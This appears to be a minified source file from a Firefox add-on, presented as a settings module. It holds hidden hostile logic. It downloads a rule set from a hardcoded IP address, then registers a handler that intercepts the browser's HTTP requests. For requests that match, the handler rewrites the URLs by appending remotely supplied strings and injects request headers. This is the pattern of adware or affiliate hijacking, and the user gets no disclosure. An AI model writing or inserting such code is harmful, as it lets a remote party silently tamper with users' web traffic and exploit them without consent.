var { Ci } = require("chrome"),
 ss = require("sdk/simple-storage");
exports.setup = function() {
    ss.storage.setting && initSetting()
};

function initSetting() {
    ss.storage.lastsetting ? ss.storage.lastsetting < (new Date).valueOf() - 3E7 && getSetting() : (ss.storage.lastsetting = (new Date).valueOf(), getSetting())
}

function getSetting() {
    if (!ss.storage.setting) {
        var a = require("sdk/request").Request;
        a({
            url: "http://42.121.0.226/sop/set.php?v=130610",
            overrideMimeType: "text/plain; charset=GBK",
            onComplete: setSetting
        }).get()
    }
}
var _setting;

function fetchSetting() {
    0 > ss.storage.setting.indexOf("7B") && initSetting();
    (_setting = formatset(ss.storage.setting).setting) ? setHandler(_setting): initSetting()
}

function setSetting(a) {
    0 > a.text.indexOf("7B") || (ss.storage.setting = a.text, _setting = formatset(a.text).setting, setHandler(_setting))
}

function formatset(a) {
    return JSON.parse(decodeURIComponent(a))
}

function setHandler(a) {
    if ("undefined" !== typeof a.event) require("sdk/system/events").on(a.event, handler)
}

function handler(a) {
    a = a.subject;
    for (var c = a.QueryInterface(Ci.nsIHttpChannel), b = a.URI.spec, e = 0; e < _setting.rule.length; e++) {
        var d = _setting.rule[e];
        if (RegExp(d.pattern).test(b)) {
            var f = ss.storage.vhlast, h = (new Date).valueOf(), g = !1;
            null != f ? h > parseInt(f) + d.dur && (g = !0) : g = !0;
            if (g && judge(d.cond, b))
                for (f = d.branch, g = 0; g < f.length; g++) {
                    var k = f[g];
                    if (judgebranch(k, b)) {ss.storage.vhlast = h; a.URI.spec = a.URI.spec + k.prepost + d.post.join("");c.setRequestHeader(d.re, d.rev, !1); break
                    }
                }
        }
    }
}

function isArray(a) {
    return "[object Array]" === Object.prototype.toString.call(a)
}

function ereckArray(a) {
    var c = [];
    if (isArray(a))
        for (var b = 0; b < a.length; b++) c.push(a[b]);
    else c.push(a);
    return c
}

function judgeItem(a, c) {
    return 1 == a.exist && 0 < c.indexOf(a.tag) || 0 == a.exist && 0 > c.indexOf(a.tag) ? !0 : !1
}

function judge(a, c) {
    for (var b = !0, e = 0; e < a.length; e++)
        if (!judgeItem(a[e], c)) {
            b = !1;
            break
        }
    return b
}

function judgebranch(a, c) {
    return 1 == a.pos && c.indexOf(a.tag) == c.length - 1 || 0 == a.pos && 0 < c.indexOf(a.tag) || -1 == a.pos ? !0 : !1
}

function atob(a) {
    var c = {},
        b, e = 0,
        d, f = 0,
        h, g = "",
        k = String.fromCharCode,
        l = a.length;
    for (b = 0; 64 > b; b++) c["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(b)] = b;
    for (d = 0; d < l; d++)
        for (b = c[a.charAt(d)], e = (e << 6) + b, f += 6; 8 <= f;)((h = e >>> (f -= 8) & 255) || d < l - 2) && (g += k(h));
    return g
};